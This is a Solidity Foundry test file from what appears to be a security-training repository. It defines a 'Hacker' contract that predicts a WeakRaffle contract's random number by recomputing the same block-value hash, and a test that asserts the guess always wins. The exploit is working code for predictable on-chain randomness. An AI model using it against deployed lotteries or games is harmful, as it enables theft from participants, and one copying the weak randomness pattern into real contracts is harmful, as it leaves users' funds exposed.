// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { DeployRaffle } from "script/Randomness.s.sol";
import { WeakRaffle } from "src/Randomness.sol";

// ----------------------------------------------------- //
// ----------------- Exploit Contract ------------------ //
// ----------------------------------------------------- //

contract Hacker {
    WeakRaffle WR;
    constructor(address _WR) {
        WR = WeakRaffle(_WR);
    }
    function EnterRaffle() public view returns(bool) {
        uint8 Random = uint8(uint256(keccak256(abi.encodePacked(
            /* msg.sender */ address(this), block.timestamp, block.number + 1, block.prevrandao
        ))) % 10);
        return WR.EnterRaffle(Random);
    }
}

// ----------------------------------------------------- //
// ----------------- Exploit Method -------------------- //
// ----------------------------------------------------- //

contract ExploitWeakRaffle is Test {

    WeakRaffle WR;
    Hacker hack;

    function setUp() public {
        WR = new DeployRaffle().run();
        hack = new Hacker(address(WR));
    }

    function test_exploit_weak_randomness(uint /* input */) public view {
        assertEq(hack.EnterRaffle(), true);
    }

}